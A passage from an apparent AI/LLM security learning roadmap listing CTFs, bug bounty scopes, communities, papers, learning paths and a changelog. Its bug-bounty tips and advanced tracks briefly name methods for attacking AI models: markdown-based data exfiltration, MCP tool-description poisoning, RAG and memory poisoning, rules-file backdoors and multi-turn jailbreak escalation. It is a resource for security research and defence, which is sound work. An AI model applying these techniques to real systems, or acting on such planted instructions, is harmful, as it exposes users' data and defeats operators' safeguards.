| OWASP FinBot CTF ⭐ | Agentic AI CTF from the OWASP GenAI Security Project; challenges mapped to LLM Top 10, ASI Top 10, CWE, ATLAS | [owasp-finbot-ctf.org](https://owasp-finbot-ctf.org/) |
| Crucible | Ongoing AI security challenges | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| HackAPrompt | Annual prompt injection competition | [hackaprompt.com](https://www.hackaprompt.com/) |
| AI Village CTF (DEF CON) | Annual AI security CTF at DEF CON | [aivillage.org](https://aivillage.org/) |
| Gandalf | Self-paced LLM challenge, 8 levels | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| Prompt Airlines | Gamified injection challenges | [promptairlines.com](https://promptairlines.com/) |
| Hack The Box AI Challenges | HTB AI-themed challenges | [hackthebox.com](https://www.hackthebox.com/) |
| Secdim AI Games | Web-based AI security games | [play.secdim.com/game/ai](https://play.secdim.com/game/ai) |
| Gray Swan Arena | Recurring public jailbreak/agent red-teaming competitions with prizes and leaderboards | [grayswan.ai](https://www.grayswan.ai/) |
| PromptTrace Gauntlet | 15-level CTF with full context trace, real LLMs | [prompttrace.airedlab.com](https://prompttrace.airedlab.com/) · `Unverified` |
| CrowdStrike AI Unlocked | Agent-focused, increasingly capable challenges (Feb 2026) | [crowdstrike.com](https://www.crowdstrike.com/en-us/blog/introducing-ai-unlocked-interactive-prompt-injection-challenge/) |
| ctf-prompt-injection (CharlesTheGreat77) | Dockerized, self-hostable, Ollama + local LLM | [GitHub](https://github.com/CharlesTheGreat77/ctf-prompt-injection) |
| ai-prompt-ctf (c-goosen) | Indirect injection against tool-calling agents (RAG, ReAct, function calling) | [GitHub](https://github.com/c-goosen/ai-prompt-ctf) |
| AI/LLM Exploitation Challenges — 8ksec | Structured AI/ML CTF challenges | [8ksec.io](https://academy.8ksec.io/course/ai-exploitation-challenges) |

---

## Bug Bounty Programs

AI/ML security bug bounties are growing rapidly — but **scopes differ sharply, and reading the scope is the single highest-value thing you can do before submitting.** The most common wasted report in 2026 is a prompt-injection finding sent to a program that explicitly excludes them.

| Program | Scope notes | Link |
|---|---|---|
| **OpenAI Security Bug Bounty** | Traditional security vulnerabilities across ChatGPT, API and infrastructure | [bugcrowd.com/openai](https://bugcrowd.com/openai) |
| **OpenAI Safety Bug Bounty** ⭐ NEW | Explicitly scopes **third-party prompt injection and data exfiltration** against agentic products (Browser, ChatGPT Agent). Jailbreaks out of scope; general content-policy bypasses out of scope | [openai.com/index/safety-bug-bounty](https://openai.com/index/safety-bug-bounty/) |
| **OpenAI Bio Bug Bounty** | Invite/NDA program, rolling applications, model-specific scope that rotates | [openai.com/index/bio-bug-bounty](https://openai.com/index/bio-bug-bounty/) |
| **Anthropic** | Claude, API, and a model-safety program focused on universal jailbreaks against deployed safeguards. Now run publicly on HackerOne | [anthropic.com/security](https://www.anthropic.com/security) |
| **Google AI VRP** | Gemini apps, Search, Workspace core, AI Studio. ⚠️ **Prompt injection, jailbreaks and alignment issues are explicitly out of scope** — send those elsewhere. Rewards emphasize sensitive-data exfiltration and state-changing bugs | [bughunters.google.com](https://bughunters.google.com/) |
| **Microsoft (Copilot, Azure AI)** | Copilot consumer AI experiences and Azure OpenAI; updated in 2026 to accept moderate-severity submissions | [msrc.microsoft.com](https://msrc.microsoft.com/create-report) |
| **Meta AI Bug Bounty** | Llama models, Meta AI | [facebook.com/whitehat](https://www.facebook.com/whitehat) |
| **Huntr (AI/ML focused)** | Open-source ML libraries, and the Hugging Face Hub / models / spaces surface | [huntr.com](https://huntr.com/) |
| **0DIN (Mozilla)** | GenAI-specific bounty program accepting jailbreak and model-manipulation classes that mainstream VRPs reject | [0din.ai](https://0din.ai/) |

> **Verification note:** program scopes and payout tables change frequently. Every entry above should be re-read on the official page before you invest research time. Nothing in this table should be treated as a guarantee that a class of finding will be rewarded.

**Tips for AI bug bounty:**
- Focus on **data exfiltration via markdown rendering** (still the most consistently paid finding)
- Test **MCP tool poisoning** — embed instructions in tool descriptions
- Test **plugin/tool integrations** thoroughly for SSRF, RCE
- Look for **prompt injection in RAG pipelines**
- Explore **memory and persistent context manipulation**
- Check for **cross-tenant data leakage** in multi-user deployments
- Test **AI IDE rules files** for backdoor injection vectors
- Look for **multi-turn escalation** bypasses in long conversations
- **Demonstrate impact, not behavior.** "The model said something bad" is not a finding. "An attacker-controlled document caused the agent to exfiltrate another user's data" is
- Transfer your web skills: AuthZ, IDOR, SSRF and cache deception reached through an AI feature are often the highest-severity, fastest-triaged bugs in these programs

---

## Community & News

### Communities

- [AI Village](https://aivillage.org/) — DEF CON's AI security community
- [OWASP AI Exchange](https://owaspai.org/) — Open standard for AI security
- [OWASP Gen AI Security Project](https://genai.owasp.org/) — Standards body maintaining the LLM Top 10, Agentic Top 10, ACS and FinBot; 30,000+ members. Working groups are open on OWASP Slack
- [ProtectAI](https://protectai.com/) — AI security research and tools
- [Embrace the Red — Blog](https://embracethered.com/blog/) — Leading blog on LLM security
- [Kai Greshake's Research](https://kai-greshake.de/) — Indirect prompt injection research
- [r/llmsecurity](https://www.reddit.com/r/llmsecurity/) — Most active LLM security subreddit

### Researchers Worth Following

Johann Rehberger (Embrace the Red) · Simon Willison · Kai Greshake · Florian Tramèr and the ETH SPY Lab (AgentDojo, adaptive attacks) · Edoardo Debenedetti · Nicholas Carlini (training-data extraction, adaptive attacks) · Rich Harang and Leon Derczynski (NVIDIA, garak) · Steve Wilson, John Sotiropoulos, Rock Lambros and the OWASP GenAI leads · Invariant Labs · HiddenLayer and Palo Alto Unit 42 research teams

### Newsletters & Blogs

- [Simon Willison's Weblog](https://simonwillison.net/) — Authoritative LLM security commentary; the [prompt-injection tag](https://simonwillison.net/tags/prompt-injection/) is the best running archive
- [AI Weekly](https://aiweekly.co/) — Tracks what influential AI experts and organizations are reading and sharing
- [The Batch — DeepLearning.AI](https://www.deeplearning.ai/the-batch/) — Weekly AI news
- [HiddenLayer Research](https://hiddenlayer.com/research/) — AI security research
- [Lakera Blog](https://www.lakera.ai/blog) — LLM and agentic AI security insights
- [PortSwigger Research](https://portswigger.net/research) — Web + AI security research
- [Adversa AI Blog](https://adversa.ai/blog/) — Real-world AI security incidents and red teaming
- [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/) — MCP and agentic attack-vector research
- [Microsoft Security Blog — AI](https://www.microsoft.com/en-us/security/blog/) — FIDES, recommendation poisoning, Copilot defenses
- [Google Online Security Blog](https://security.googleblog.com/) — Indirect prompt injection defense methodology and AI VRP reasoning
- [Anthropic Research & News](https://www.anthropic.com/research) — Agentic misuse disclosures and safeguards research
- [Cloud Security Alliance AI research](https://labs.cloudsecurityalliance.org/) — Consolidation notes on agentic browser exploits, MCP, skill poisoning

---

## Key Academic Papers

| Paper | Year | Topic |
|---|---|---|
| [Explaining and Harnessing Adversarial Examples — Goodfellow et al.](https://arxiv.org/abs/1412.6572) | 2014 | Adversarial examples · `Foundational` |
| [Membership Inference Attacks against ML Models — Shokri et al.](https://arxiv.org/abs/1610.05820) | 2017 | Membership inference · `Foundational` |
| [Attention Is All You Need — Vaswani et al.](https://arxiv.org/abs/1706.03762) | 2017 | Transformer architecture · `Foundational` |
| [Extracting Training Data from Large Language Models — Carlini et al.](https://arxiv.org/abs/2012.07805) | 2021 | Training-data extraction |
| [Not What You've Signed Up For — Greshake et al.](https://arxiv.org/abs/2302.12173) | 2023 | Indirect prompt injection · `Foundational` |
| [Prompt Injection Attack against LLM-Integrated Applications](https://arxiv.org/abs/2306.05499) | 2023 | Prompt injection |
| [Jailbroken: How Does LLM Safety Training Fail? — Wei et al.](https://arxiv.org/abs/2307.02483) | 2023 | Jailbreak theory |
| [Universal and Transferable Adversarial Attacks on Aligned LMs — Zou et al.](https://arxiv.org/abs/2307.15043) | 2023 | GCG / universal adversarial suffixes |
| [FigStep: Jailbreaking Large Vision-Language Models via Typographic Visual Prompts](https://arxiv.org/abs/2311.05608) | 2023 | Multimodal jailbreak |
| [InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated Agents](https://arxiv.org/abs/2403.02691) | 2024 | Agent benchmark |
| [HarmBench: Standardized Evaluation for Automated Red Teaming](https://arxiv.org/abs/2402.04249) | 2024 | Red-team benchmark |
| [AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses](https://arxiv.org/abs/2406.13352) | 2024 | Agent security benchmark ⭐ |
| [garak: A Framework for Security Probing Large Language Models](https://arxiv.org/abs/2406.11036) | 2024 | Scanning methodology |
| [PoisonedRAG: Knowledge Corruption Attacks on RAG](https://arxiv.org/abs/2402.07867) | 2024/25 | RAG poisoning (USENIX Sec 2025) |
| [CaMeL: Defeating Prompt Injections by Design](https://arxiv.org/abs/2503.18813) | 2025 | Architectural defense ⭐ |
| [Attention Tracker: Detecting Prompt Injection via Attention Distribution Shifts](https://aclanthology.org/2025.findings-naacl.123.pdf) | 2025 | Detection (NAACL) |
| [ToolHijacker: Prompt Injection to Tool Selection in LLM Agents](https://arxiv.org/abs/2504.19793) | 2025 | Tool-selection attacks |
| [WASP: Benchmarking Web Agent Security Against Prompt Injection](https://arxiv.org/abs/2504.18575) | 2025 | Web agent benchmark |
| [A Critical Evaluation of Defenses against Prompt Injection Attacks](https://arxiv.org/abs/2505.18333) | 2025 | Defense evaluation |
| [VPI-Bench: Visual Prompt Injection for Computer-Use Agents](https://arxiv.org/abs/2506.02456) | 2025 | Multimodal / CUA |
| [Prompt Injection 2.0: Hybrid AI Threats (XSS + CSRF + AI worms)](https://arxiv.org/abs/2507.13169) | 2025 | Hybrid web/AI attacks |
| [PromptArmor: Simple yet Effective Prompt Injection Defenses](https://arxiv.org/abs/2507.15219) | 2025 | Detection defense |
| [Your AI, My Shell: Prompt Injection on Agentic Coding Editors](https://arxiv.org/abs/2509.22040) | 2025 | Coding assistants |
| [WAInjectBench: Benchmarking Prompt Injection Detection for Web Agents](https://arxiv.org/abs/2510.01354) | 2025 | Detection benchmark |
| [The Attacker Moves Second: Adaptive Attacks Bypass 12 Published Defenses at >90%](https://arxiv.org/abs/2510.09023) | 2025 | Adaptive attacks ⭐ |
| [Securing AI Agents Against Prompt Injection — 847 test cases, 73.2% → 8.7%](https://arxiv.org/abs/2511.15759) | 2025 | Agent defense |
| [CaMeLs Can Use Computers Too: System-level Security for Computer Use Agents](https://arxiv.org/abs/2601.09923) | 2026 | Computer-use defense |
| [Agent Skills in the Wild: Empirical Study of Security Vulnerabilities at Scale](https://arxiv.org/abs/2601.10338) | 2026 | Skill supply chain ⭐ |
| [Malicious Agent Skills in the Wild ("Do Not Mention This to the User")](https://arxiv.org/abs/2602.06547) | 2026 | Malicious skill detection |
| [The Landscape of Prompt Injection Threats in LLM Agents (SoK + AgentPI benchmark)](https://arxiv.org/abs/2602.10453) | 2026 | SoK · `Unverified` ID |
| [Prompt Injection Attacks on Agentic Coding Assistants (SoK, 78 studies)](https://arxiv.org/html/2601.17548v1) | 2026 | SoK · `Unverified` ID |
| [Towards Secure RAG: Threats, Defenses and Benchmarks](https://arxiv.org/abs/2603.21654) | 2026 | RAG survey · `Unverified` ID |
| [Prompt Injection in LLMs and AI Agent Systems — MDPI](https://www.mdpi.com/2078-2489/17/1/54) | 2026 | Survey |

---

## Suggested Learning Path by Experience Level

### 🟢 Beginner (0–3 months)

1. Complete [PortSwigger Web Security Academy](https://portswigger.net/web-security) fundamentals
2. Learn Python basics
3. Take [Google ML Crash Course](https://developers.google.com/machine-learning/crash-course)
4. Read the [OWASP GenAI LLM Top 10 (2026)](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) — then skim the 2025 list so you recognize the older category names in tooling
5. Play [Gandalf](https://gandalf.lakera.ai/) — all 8 levels
6. Read [Simon Willison's prompt injection article](https://simonwillison.net/2023/May/2/prompt-injection-explained/)
7. Watch [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g) and the [tokenizer video](https://www.youtube.com/watch?v=zduSFxRajkE)
8. Read [Prompt Injection Cheat Sheet — Seclify](https://blog.seclify.com/prompt-injection-cheat-sheet/)
9. Deploy [AIGoat](https://github.com/AISecurityConsortium/AIGoat) locally and work the labs — no API keys or cloud accounts needed

### 🟡 Intermediate (3–9 months)

1. Study the [MITRE ATLAS Matrix](https://atlas.mitre.org/matrices/ATLAS/) including the 2025–26 agentic techniques, and read the [case studies](https://atlas.mitre.org/studies/)
2. Complete [PortSwigger LLM Attack labs](https://portswigger.net/web-security/llm-attacks)
3. Set up and exploit [Damn Vulnerable LLM Agent](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent)
4. Work [OWASP FinBot CTF](https://owasp-finbot-ctf.org/) and [Crucible](https://crucible.dreadnode.io/)
5. Read the [LLM Hacker's Handbook](https://github.com/forcesunseen/llm-hackers-handbook)
6. Study [Embrace the Red blog](https://embracethered.com/blog/) in full
7. Experiment with [garak](https://github.com/NVIDIA/garak), [PyRIT](https://github.com/Azure/PyRIT) and [promptfoo](https://github.com/promptfoo/promptfoo) — get one running in CI
8. Try the [Offensive ML Playbook](https://wiki.offsecml.com/Welcome+to+the+Offensive+ML+Playbook)
9. Run [DVMCP](https://github.com/harishsg993010/damn-vulnerable-MCP-server) and reproduce [Invariant's tool-poisoning PoCs](https://github.com/invariantlabs-ai/mcp-injection-experiments)
10. Read [Palo Alto Unit 42 MCP Attack Vectors](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) and the [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/)
11. Build a small RAG app, then poison your own corpus and try to break tenant isolation

### 🔴 Advanced (9+ months)

1. Participate in [AI Village CTF at DEF CON](https://aivillage.org/) and [Gray Swan](https://www.grayswan.ai/) arenas
2. Submit findings to [Huntr](https://huntr.com/), [OpenAI Safety Bug Bounty](https://openai.com/index/safety-bug-bounty/) or [0DIN](https://0din.ai/) — match the finding class to the scope
3. Study adversarial ML with [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox) and [CleverHans](https://github.com/cleverhans-lab/cleverhans); use [NIST AI 100-2e2025](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-2e2025.pdf) as your vocabulary
4. Read the 2025–2026 papers: CaMeL, The Attacker Moves Second, the coding-assistant and skill-ecosystem SoKs
5. Run [AgentDojo](https://github.com/ethz-spylab/agentdojo) against your own agent and report ASR with a benign-utility baseline — numbers without a utility baseline are meaningless
6. Set up a local MCP environment and test tool poisoning, shadowing, rug pulls and cross-server contamination
7. Contribute to open source tools like [garak](https://github.com/NVIDIA/garak), [mcp-scan](https://github.com/invariantlabs-ai/mcp-scan) or [AI Exploits](https://github.com/protectai/ai-exploits)
8. Build your own vulnerable agentic demo environment with MCP integration
9. Write and publish research — blog posts, CVEs, conference talks

### 🎯 Specialization Tracks

Once past intermediate, depth beats breadth. Pick one:

**Agent Security Specialist** — OWASP ASI Top 10 → AgentDojo and WASP → memory poisoning and A2A → agent identity, short-lived credentials and sandboxing → build and break a multi-agent pipeline.

**MCP / Protocol Security** — MCP spec (authorization sections) → OWASP MCP Top 10 → DVMCP → Invariant PoCs → OAuth 2.1, audience binding and token passthrough → write a scanner check that catches something `mcp-scan` misses.

**AI Supply Chain** — NIST AI 100-2e2025 poisoning taxonomy → pickle/safetensors internals → ModelScan and picklescan → the skill-ecosystem papers → model signing, AIBOM and provenance.

**AI Red Teamer** — garak/PyRIT/promptfoo fluency → HarmBench and JailbreakBench methodology → multi-turn and adaptive attacks → write reproducible, quantified reports rather than one-off screenshots.

---

## What's New in This Edition

*(Changes made in the September 2026 revision, relative to the March 2026 edition.)*

| Area | What Changed |
|---|---|
| **OWASP 2026 standards** | Added OWASP GenAI LLM Top 10 **2026** (published 4 Aug 2026; Hidden Context Exposure replaces System Prompt Leakage, Excessive Agency up to LLM03) alongside the retained 2025 and 2023 versions; added Top 10 for Agentic Applications (ASI01–ASI10), OWASP MCP Top 10, and the Agent Control Standard |
| **New Phase 5 — RAG, Vector & Embedding Security** | Corpus poisoning, embedding inversion, cross-tenant retrieval, authorization drift, plus a practical 7-point RAG testing checklist. Hands-On, Advanced Exploitation and Bug Bounty renumbered to Phases 6–8 |
| **MCP section expanded** | OWASP MCP Top 10 taxonomy, MCP spec authorization gaps, rug pulls, token passthrough, shadow MCP, STDIO credential inheritance; real CVEs (CVE-2025-6514 `mcp-remote`, EscapeRoute, Git MCP argument injection) and incidents (Supabase/Cursor, Asana) |
| **New 4.4 — Agent Skills & Plugin Supply Chain** | `SKILL.md` poisoning, the ToxicSkills and ClawHavoc findings, Cato CTRL ransomware-via-skill research, HiddenLayer analysis, first agentic-AI CVE, plus two 2026 arXiv empirical studies |
| **New 4.6 — Computer-Use & Browser Agents** | UW study, Brave disclosures, CSA PleaseFix consolidation of the zero-click class, VPI-Bench, WASP, WAInjectBench, a safe local PoC repo |
| **New 4.7 / 4.9 — Multimodal & Agent Identity** | Typographic and non-textual jailbreaks, document and calendar-invite channels; confused-deputy testing, audience-bound tokens, per-agent identity |
| **New 3.5 — Defenses Worth Breaking** | CaMeL, FIDES, PromptArmor, and the two papers showing published defenses fail under adaptive attack |
| **New Benchmarks & Datasets section** | AgentDojo, InjecAgent, WASP, WAInjectBench, VPI-Bench, HarmBench, JailbreakBench, CyberSecEval, NotInject |
| **Hands-on labs expanded** | OWASP FinBot CTF, AIGoat, DVMCP, OWASP GenAI Red Team Lab, Invariant injection experiments — all self-hostable, several fully offline |
| **Tools** | New MCP & Agent Security tool table (mcp-scan, Cisco mcp-scanner, skill-scanner); added promptfoo, DeepTeam, Giskard, LLM Guard, picklescan, TextAttack, Counterfit |
| **Papers** | Expanded to include a Topic column; ~15 papers added across agents, RAG, skills, multimodal and defenses |
| **Bug bounty** | Added OpenAI Safety and Bio bounties and 0DIN; flagged that Google AI VRP excludes prompt injection and jailbreaks; added scope-verification warning |
| **Link fixes** | `leondz/garak` → `NVIDIA/garak`; `facebookresearch/PurpleLlama` → `meta-llama/PurpleLlama`; the placeholder `https://owasp.org/` MCP cheat-sheet link now points to the real OWASP MCP Top 10 project; the GenAI Red Teaming Guide no longer points at the LLM Top 10 project page; Andrew Ng course now lists its current successor alongside the original |
| **Provenance labels** | Added `Foundational` / `Historical` / `Legacy` / `Archived` / `Unverified` markers so older entries are contextualized rather than deleted |

---

*Last updated: September 2026 | Contributions welcome — submit a PR with new resources.*

*Entries marked `Unverified` are community submissions that maintainers have not independently validated. If you can confirm or refute one, please open an issue.*
